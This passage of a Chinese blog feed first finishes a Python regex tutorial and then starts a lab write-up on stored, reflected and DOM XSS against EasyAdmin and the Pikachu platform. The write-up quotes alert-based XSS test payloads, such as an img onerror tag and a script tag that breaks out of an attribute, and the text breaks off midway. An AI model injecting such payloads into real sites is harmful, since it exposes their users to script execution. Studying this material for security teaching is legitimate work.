align="center">(ab)</td><td align="left">将括号中字符作为一个分组</td></tr><tr><td align="center">\num</td><td align="left">引用分组num匹配到的字符串</td></tr><tr><td align="center">(?P<code>&lt;name&gt;</code>)</td><td align="left">分组起别名</td></tr><tr><td align="center">(?P=name)</td><td align="left">引用别名为name分组匹配到的字符串</td></tr></tbody></table><h3 id="7-1-示例1："><a href="#7-1-示例1：" class="headerlink" title="7.1 示例1：|"></a>7.1 示例1：|</h3><p>需求：匹配出0-100之间的数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ret = re.match(<span class="string">"[1-9]?\d"</span>,<span class="string">"8"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;8&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">"[1-9]?\d"</span>,<span class="string">"78"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;78&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不确定的情况下</span></span><br><span class="line">re.match(<span class="string">"[1-9]?\d"</span>,<span class="string">"08"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;0&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修正之后的</span></span><br><span class="line">re.match(<span class="string">"[1-9]?\d$"</span>,<span class="string">"08"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-106-70c347cddb39&gt; in &lt;module&gt;      1 # 修正之后的----&gt; 2 re.match(&quot;[1-9]?\d$&quot;,&quot;08&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><ul><li>添加 |</li></ul><p>可匹配0到100（包括0和100）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加 |</span></span><br><span class="line">re.match(<span class="string">"[1-9]?\d$|100"</span>,<span class="string">"100"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;100&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">"[1-9]?\d$|100"</span>,<span class="string">"0"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;0&apos;</code></pre><h3 id="7-2-示例2："><a href="#7-2-示例2：" class="headerlink" title="7.2 示例2：()"></a>7.2 示例2：()</h3><p>需求：匹配出163、126、qq邮箱直接的数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">"\w&#123;4,20&#125;@163\.com"</span>,<span class="string">"test@163.com"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;test@163.com&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用 （）分组</span></span><br><span class="line">re.match(<span class="string">"\w&#123;4,20&#125;@(163|126|qq)\.com"</span>,<span class="string">"test@126.com"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;test@126.com&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">"\w&#123;4,20&#125;@(163|126|qq)\.com"</span>,<span class="string">"test@gmail.com"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-111-d286dbf8fcf2&gt; in &lt;module&gt;----&gt; 1 re.match(&quot;\w{4,20}@(163|126|qq)\.com&quot;,&quot;test@gmail.com&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><ul><li>练习：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"([^-]*)-(\d+)"</span>,<span class="string">"010-12345678"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;010-12345678&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret.groups()</span><br></pre></td></tr></table></figure><pre><code>Out:(&apos;010&apos;, &apos;12345678&apos;)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret.group()默认ret.group(0)</span></span><br><span class="line">ret.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;010&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret.group(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;12345678&apos;</code></pre><h3 id="7-3-示例3："><a href="#7-3-示例3：" class="headerlink" title="7.3 示例3：\"></a>7.3 示例3：\</h3><p>需求：匹配出<code>&lt;html&gt;hh&lt;/html&gt;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 能够完成对正确的字符串的匹配</span></span><br><span class="line">re.match(<span class="string">"&lt;[a-zA-Z]*&gt;\w*&lt;/[a-zA-Z]*&gt;"</span>,<span class="string">"&lt;html&gt;hh&lt;/html&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;&lt;html&gt;hh&lt;/html&gt;&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 遇到非正常的html格式字符串，匹配出错</span></span><br><span class="line">re.match(<span class="string">"&lt;[a-zA-Z]*&gt;\w*&lt;/[a-zA-Z]*&gt;"</span>, <span class="string">"&lt;html&gt;hh&lt;/htmlbalabala&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;&lt;html&gt;hh&lt;/htmlbalabala&gt;&apos;</code></pre><ul><li>思路：如果在第一对&lt;&gt;中是什么，按理说后面的那对&lt;&gt;中就应该是什么</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过引用分组中匹配到的数据即可,但是要注意是元字符串，即类似r""这种格式</span></span><br><span class="line">re.match(<span class="string">r"&lt;([a-zA-Z]*)&gt;\w*&lt;/\1&gt;"</span>,<span class="string">"&lt;html&gt;hh&lt;/html&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;&lt;html&gt;hh&lt;/html&gt;&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 因为2对&lt;&gt;中的数据不一致，所以没匹配出来</span></span><br><span class="line">re.match(<span class="string">r"&lt;([a-zA-Z]*)&gt;\w*&lt;/\1&gt;"</span>,<span class="string">"&lt;html&gt;hh&lt;/htmlddd&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-126-f2f15b62f076&gt; in &lt;module&gt;      1 # 因为2对&lt;&gt;中的数据不一致，所以没匹配出来----&gt; 2 re.match(r&quot;&lt;([a-zA-Z]*)&gt;\w*&lt;/\1&gt;&quot;,&quot;&lt;html&gt;hh&lt;/htmlddd&gt;&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="7-4-number"><a href="#7-4-number" class="headerlink" title="7.4 \number"></a>7.4 \number</h3><p>需求：匹配出<code>&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r"&lt;(\w*&gt;)&lt;(\w*)&gt;.*&lt;/\2&gt;&lt;/\1"</span>,<span class="string">"&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt;&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r"&lt;(\w*&gt;)&lt;(\w*)&gt;.*&lt;/\2&gt;&lt;/\1"</span>,<span class="string">"&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h2&gt;&lt;/html&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-128-1cf071943a2d&gt; in &lt;module&gt;----&gt; 1 re.match(r&quot;&lt;(\w*&gt;)&lt;(\w*)&gt;.*&lt;/\2&gt;&lt;/\1&quot;,&quot;&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h2&gt;&lt;/html&gt;&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="7-5-示例5-（-P-lt-name-gt-）-P-name"><a href="#7-5-示例5-（-P-lt-name-gt-）-P-name" class="headerlink" title="7.5 示例5:（?P&lt;name&gt;）(?P=name)"></a>7.5 示例5:<code>（?P&lt;name&gt;）(?P=name)</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">r"&lt;(?P&lt;name1&gt;\w*)&gt;&lt;(?P&lt;name2&gt;\w*)&gt;.*&lt;/(?P=name2)&gt;&lt;/(?P=name1)&gt;"</span>, <span class="string">"&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;&apos;</code></pre><ul><li>注意：<code>(?P&lt;name&gt;)和(?P=name)</code>中的字母p大写</li></ul><h2 id="0x08-re模块的高级用法"><a href="#0x08-re模块的高级用法" class="headerlink" title="0x08 re模块的高级用法"></a>0x08 re模块的高级用法</h2><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>需求：匹配出文章的阅读次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret =re.search(<span class="string">r"\d+"</span>,<span class="string">"阅读次数为9999"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;9999&apos;</code></pre><h3 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h3><p>需求：统计出python、c、c++相应文章阅读的次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.findall(<span class="string">r"\d+"</span>,<span class="string">"python=9999,c=7890,c++=1234"</span>)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><pre><code>Out:[&apos;9999&apos;, &apos;7890&apos;, &apos;1234&apos;]</code></pre><h3 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h3><blockquote><p>将匹配到的数据进行替换</p></blockquote><p>需求：将匹配到的阅读次数加1</p><ul><li>方法1</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub（要匹配的模式，要替换的内容，被替换的内容）</span></span><br><span class="line">ret =re.sub(<span class="string">r"\d+"</span>,<span class="string">"998"</span>,<span class="string">"python=997"</span>)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><pre><code>OUt:&apos;python=998&apos;</code></pre><ul><li>方法2 </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub可传递函数，将匹配到的内容再以参数形式传给定义的函数</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(temp)</span>:</span></span><br><span class="line">    print(temp)</span><br><span class="line">    strNum = temp.group()</span><br><span class="line">    num =int(strNum) +<span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> str(num)</span><br><span class="line"></span><br><span class="line">ret =re.sub(<span class="string">r"\d+"</span>,add,<span class="string">"python=997"</span>)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><pre><code>Out:&lt;re.Match object; span=(7, 10), match=&apos;997&apos;&gt;Out:&apos;python=998&apos;</code></pre><ul><li>练习:从下面的字符串中取出文本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">&lt;p&gt;岗位职责： &lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;完成推荐算法、 数据统计、 接⼝、 后台等服务器端相关⼯作&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;必备要求： &lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;良好的⾃我驱动⼒和职业素养， ⼯作积极主动、 结果导向&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;&amp;nbsp;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;技术要求： &lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;1、 ⼀年以上 Python 开发经验， 掌握⾯向对象分析和设计， 了解设计模式&lt;&#x2F;p</span><br><span class="line">&gt; &lt;</span><br><span class="line">p&gt;2、 掌握HTTP协议， 熟悉MVC、 MVVM等概念以及相关WEB开发框架&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;3、 掌握关系数据库开发设计， 掌握 SQL， 熟练使⽤ MySQL&#x2F;PostgreSQL 中</span><br><span class="line">的⼀种&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;4、 掌握NoSQL、 MQ， 熟练使⽤对应技术解决⽅案&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"""&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;岗位职责：&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;完成推荐算法、 数据统计、 接口、 后台等服务器端相关工作&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;&lt;br&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;必备要求： &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;良好的自我驱动力和职业素养， 工作积极主动、 结果导向&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;&amp;nbsp;&lt;br&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;技术要求： &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;1、 一年以上 Python 开发经验， 掌握面向对象分析和设计， 了解设计模式&lt;/p&gt; </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">ret =re.sub(<span class="string">r"&lt;/?\w*&gt;"</span>,<span class="string">""</span>,s)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;\n岗位职责：\n完成推荐算法、 数据统计、 接口、 后台等服务器端相关工作\n\n必备要求： \n良好的自我驱动力和职业素养， 工作积极主动、 结果导向\n&amp;nbsp;\n技术要求： \n1、 一年以上 Python 开发经验， 掌握面向对象分析和设计， 了解设计模式 \n&apos;</code></pre><h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><blockquote><p>根据匹配进行切割字符串，并返回一个列表</p></blockquote><p>需求：切割字符串“info:dddd 33 shandong”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret =re.split(<span class="string">r":| "</span>,<span class="string">"info:dddd 33 shandong"</span>)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><pre><code>Out:[&apos;info&apos;, &apos;dddd&apos;, &apos;33&apos;, &apos;shandong&apos;]</code></pre><h2 id="0x09-Python贪婪和非贪婪"><a href="#0x09-Python贪婪和非贪婪" class="headerlink" title="0x09 Python贪婪和非贪婪"></a>0x09 Python贪婪和非贪婪</h2><p>Python里数量词默认是贪婪的（在少数语言里也可能是默认非贪婪），总是尝试匹配尽可能多的字符；</p><p>非贪婪相反，总是尝试匹配尽可能少的字符。</p><p>在<code>*</code>、<code>?</code>、<code>+</code>、<code>{m,n}</code>后面加上<code>？</code>，使贪婪变成非贪婪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"this is a number 234-235-22-423"</span></span><br><span class="line">r = re.match(<span class="string">".+(\d+-\d+-\d+-\d+)"</span>,s)</span><br><span class="line">r.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;4-235-22-423&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 变为非贪婪</span></span><br><span class="line">r = re.match(<span class="string">".+?(\d+-\d+-\d+-\d+)"</span>,s)</span><br><span class="line">r.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;234-235-22-423&apos;</code></pre><ul><li><p>说明：<br>正则表达式模式中使用到通配字， 那它在从左到右的顺序求值时， 会尽量“抓取”满足匹配最长字符串， 在我们上面的例子里面， “.+”会从字符串的起始处抓取满足模式的最长字符， 其中包括我们想得到的第一个整型字段的中的大部分，“\d+”只需一位字符就可以匹配， 所以它匹配了数字“4”， 而“.+”则匹配了从字符串起始到这个第一位数字4之前的所有字符。</p></li><li><p>解决方式：非贪婪操作符“？”,这个操作符可以用在<code>*</code>、<code>?</code>、<code>+</code>、<code>{m,n}</code>后面，要求正则匹配的越少越好。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r"aa(\d+)"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;2343&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r"aa(\d+?)"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;2&apos;</code></pre><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><p>提取下面文本中图片链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;apple-touch-icon-precomposed&quot; href&#x3D;&quot;https:&#x2F;&#x2F;s.mozhe.cn&#x2F;static&#x2F;ico&#x2F;apple-touch-icon.png&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s= <span class="string">"""&lt;link rel="apple-touch-icon-precomposed" href="https://s.mozhe.cn/static/ico/apple-touch-icon.png"&gt; &lt;link rel="apple-touch-icon-precomposed" href="https://s.mozhe.cn/static/ico/apple-touch-icon.png"&gt;"""</span></span><br><span class="line">ret =re.search(<span class="string">r"https:.+?\.png"</span>,s)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;https://s.mozhe.cn/static/ico/apple-touch-icon.png&apos;</code></pre><h3 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;dd&amp;rsv_spt&#x3D;1</span><br><span class="line">正则后变为：</span><br><span class="line">https:&#x2F;&#x2F;www.baidu.com&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s= <span class="string">"""https://www.baidu.com/s?wd=dd&amp;rsv_spt=1"""</span></span><br><span class="line">re.sub(<span class="string">r"https://.+?/"</span>, <span class="string">""</span>, s)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;s?wd=dd&amp;rsv_spt=1&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用匿名函数lambda作为处理函数</span></span><br><span class="line">re.sub(<span class="string">r"(https://.+?/).*"</span>,<span class="keyword">lambda</span> x: x.group(<span class="number">1</span>),s)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;https://www.baidu.com/&apos;</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【XSS（一）】1.2 XSS（存储型-反射型-DOM型）实战</title>
      <link href="2020/04/11/1.2%20XSS%EF%BC%88%E5%AD%98%E5%82%A8%E5%9E%8B-%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM%E5%9E%8B%EF%BC%89%E5%AE%9E%E6%88%98/"/>
      <url>2020/04/11/1.2%20XSS%EF%BC%88%E5%AD%98%E5%82%A8%E5%9E%8B-%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM%E5%9E%8B%EF%BC%89%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h2><ul><li>存储型、反射型、DOM型造成XSS漏洞的简单原理、危害、攻击流程</li><li>利用EasyAdmin极简版的实战测试案例</li><li>几种XSS辅助测试工具</li></ul><a id="more"></a><h2 id="认识危害"><a href="#认识危害" class="headerlink" title="认识危害"></a>认识危害</h2><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss00.png" alt=""></p><h2 id="0x01-发现XSS"><a href="#0x01-发现XSS" class="headerlink" title="0x01 发现XSS"></a>0x01 发现XSS</h2><h3 id="1-1-XSS位置"><a href="#1-1-XSS位置" class="headerlink" title="1.1 XSS位置"></a>1.1 XSS位置</h3><ul><li>直接插入到SCRIPT标签里</li><li>插入到HTML注释里</li><li>插入到HTML标签的属性里</li><li>插入到HTML标签的名字</li><li>作为HTML标签的名字</li><li>直接插入到CSS里</li><li>……</li></ul><h3 id="1-2-手工发现"><a href="#1-2-手工发现" class="headerlink" title="1.2 手工发现"></a>1.2 手工发现</h3><ul><li><p>参数中提交XSS payload代码</p></li><li><p>在所有可以提交参数并能在页面返回的位置上</p><ul><li>URL的每一个参数</li><li>URL本身</li><li>表单</li><li>搜索框</li><li>……</li></ul></li></ul><h3 id="1-3-常见业务场景"><a href="#1-3-常见业务场景" class="headerlink" title="1.3 常见业务场景"></a>1.3 常见业务场景</h3><ul><li>重灾区：评论区、留言区、个人信息、订单信息等</li><li>针对型：站内信、网页即时通讯、私信、意见反馈等</li><li>存在风险：搜索框、当前目录、图片属性等</li></ul><h2 id="实战环境配置"><a href="#实战环境配置" class="headerlink" title="实战环境配置"></a>实战环境配置</h2><ul><li><p>EasyAdmin极简版安装：[下载链接](链接：<a href="https://pan.baidu.com/s/1mEIcBSoFBBjN9DgIDzyxcg" target="_blank" rel="noopener">https://pan.baidu.com/s/1mEIcBSoFBBjN9DgIDzyxcg</a><br>提取码：qpzn)</p></li><li><p>下载后，本地windows+phpstudy，放置在WWW目录下</p></li><li><p>访问，之后创建数据库，即可完成配置</p></li></ul><h2 id="0x01-存储型XSS实战"><a href="#0x01-存储型XSS实战" class="headerlink" title="0x01 存储型XSS实战"></a>0x01 存储型XSS实战</h2><h3 id="1-1-存储型XSS攻击流程"><a href="#1-1-存储型XSS攻击流程" class="headerlink" title="1.1 存储型XSS攻击流程"></a>1.1 存储型XSS攻击流程</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss01.png" alt=""></p><h3 id="1-2-利用easyadmin进行测试"><a href="#1-2-利用easyadmin进行测试" class="headerlink" title="1.2 利用easyadmin进行测试"></a>1.2 利用easyadmin进行测试</h3><ul><li><p>利用img标签，<code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code>进行测试存在漏洞的地方</p></li><li><p>经测试，发现在添加标签时，出现弹窗</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss02.png" alt=""></p><ul><li>发布后，当点击该帖子，即可弹窗</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss03.png" alt=""></p><ul><li>点击开发者工具，可发现对添加的图片标签进行解析了，但并未解析出来，故执行了onerror事件，弹窗</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss04.png" alt=""></p><h2 id="0x02-反射型XSS实战"><a href="#0x02-反射型XSS实战" class="headerlink" title="0x02 反射型XSS实战"></a>0x02 反射型XSS实战</h2><h3 id="2-1-反射型XSS攻击流程"><a href="#2-1-反射型XSS攻击流程" class="headerlink" title="2.1 反射型XSS攻击流程"></a>2.1 反射型XSS攻击流程</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss05.png" alt=""></p><h3 id="2-2-利用easyadmin测试"><a href="#2-2-利用easyadmin测试" class="headerlink" title="2.2 利用easyadmin测试"></a>2.2 利用easyadmin测试</h3><blockquote><p>攻击者在URL中插入XSS代码，服务端将URL中的XSS代码输出到页面上，攻击者将带有XSS代码的URL发送给用户，用户打开后受到XSS攻击</p></blockquote><ul><li>寻址存在URL的输入点，测试搜索栏</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss06.png" alt=""></p><ul><li>闭合title，并测试弹窗</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss07.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss08.png" alt=""></p><ul><li>寻找其他输入点</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss09.png" alt=""></p><ul><li>尖括号闭合，测试<code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss10.png" alt=""></p><h2 id="0x03DOM型XSS实战"><a href="#0x03DOM型XSS实战" class="headerlink" title="0x03DOM型XSS实战"></a>0x03DOM型XSS实战</h2><h3 id="3-1-测试环境"><a href="#3-1-测试环境" class="headerlink" title="3.1 测试环境"></a>3.1 测试环境</h3><ul><li>ubuntu+docker+pikachu之xss平台</li></ul><h3 id="3-2-DOM型xss测试"><a href="#3-2-DOM型xss测试" class="headerlink" title="3.2 DOM型xss测试"></a>3.2 DOM型xss测试</h3><ul><li>DOM型xss-x初始化界面：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss11.png" alt=""></p><ul><li>步骤一：输入111，URL发生变化</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss12.png" alt=""></p><ul><li>再点击新出现的，URL又发生变化</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss13.png" 